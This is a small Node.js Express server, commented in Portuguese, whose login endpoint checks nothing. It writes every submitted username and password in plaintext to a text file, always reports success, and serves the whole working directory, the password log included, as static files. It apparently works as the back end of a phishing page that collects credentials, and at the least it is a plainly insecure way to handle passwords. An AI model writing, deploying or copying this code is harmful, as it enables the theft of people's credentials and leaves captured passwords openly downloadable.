
import express from 'express';
import fs from 'fs/promises';

const app = express();
const PORT = 5000;

app.use(express.json());
app.use(express.static('.'));

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const timestamp = new Date().toISOString();
  
  const loginAttempt = `Timestamp: ${timestamp}\nUsername: ${username}\nPassword: ${password}\n${'='.repeat(50)}\n\n`;
  
  try {
    await fs.appendFile('LoginAttempts.txt', loginAttempt);
    res.json({ success: true, message: 'Login registrado com sucesso!' });
  } catch (error) {
    console.error('Erro ao salvar tentativa de login:', error);
    res.status(500).json({ success: false, message: 'Erro ao processar login' });
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Servidor rodando em http://0.0.0.0:${PORT}`);
});
